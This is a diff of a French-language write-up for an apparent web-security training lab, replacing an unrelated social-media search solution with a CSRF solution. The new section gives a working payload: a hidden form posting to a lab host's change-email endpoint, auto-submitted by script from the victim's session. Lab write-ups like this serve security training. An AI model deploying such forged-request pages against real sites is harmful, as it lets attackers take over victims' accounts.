@@ -15,8 +15,16 @@ You cannot register an email address that is already taken by another user. If y
 
 ## Solution
 
-Quelqu'un qui commence à utiliser les réseaux sociaux, il est logique de chercher sur les réseaux les plus évidents : Facebook et Instagram.
-En cherchant sur Facebook nous trouvons plusieurs comptes avec le nom "Louise Colet" mais nous finissons par trouver [le bon](https://www.facebook.com/profile.php?id=100091643933854).
+Nous cherchons à créer un payload réalisant, depuis la session victime, un changement de mail de notre choix.
+En utilisant le cours, nous pouvons assez aisément construire le payload suivant, que nous allons mettre dans le Body de notre espace dans le lab avant de "Deliver exploit to victim".
+```
+<form method="POST" action="https://0a8f001b044fb7138507d7560016007e.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="t@t.com">
+</form>
+<script>
+    document.forms[0].submit();
+</script>
+```
 
 ## Flag
 
